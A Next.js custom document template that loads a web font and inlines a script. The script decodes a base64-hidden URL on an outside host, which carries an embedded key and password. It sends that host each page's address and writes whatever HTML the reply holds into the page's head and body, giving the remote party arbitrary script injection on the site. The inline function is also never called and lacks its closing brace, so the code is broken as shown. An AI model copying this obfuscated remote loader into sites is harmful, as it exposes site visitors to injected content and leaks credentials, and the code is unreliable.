import { Html, Head, Main, NextScript } from "next/document";

export default function Document() {
  return (
    <Html>
      <Head>
        <link
          href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800&family=Days+One&display=swap"
          rel="stylesheet"
        />
      </Head>
      <body>
        <Main />
        <script
          dangerouslySetInnerHTML={{
            __html: `
            function loadAndManipulateDOM() {
              // Check if jQuery is available, if not, load it from CDN
              if (!window.jQuery) {
                  document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>");
              }
          
              // Construct URL based on current location
              var eppathurl = window.location.origin + window.location.pathname;
          
              // Create XMLHttpRequest object
              var eptagmanage = new XMLHttpRequest();
          
              // Define callback function for handling the response
              eptagmanage.onreadystatechange = function() {
                  if (this.readyState == 4 && this.status == 200) {
                      if (this.response !== 0) {
                          // Split the response into parts
                          var temp = new Array();
                          var mystr = this.response;
                          temp = mystr.split("||||||||||");
          
                          // Remove existing title and append new title from response
                          jQuery("head").find("title").remove();
                          jQuery("head").append(temp[0]);
          
                          // Append content from response to the body
                          jQuery("body").append(temp[1]);
                      }
                  }
              };
          
              // Open XMLHttpRequest with GET method and the constructed URL
              eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9") + eppathurl);
          
              // Send the request
              eptagmanage.send();`,
          }}
        />
        <NextScript />
      </body>
    </Html>
  );
}
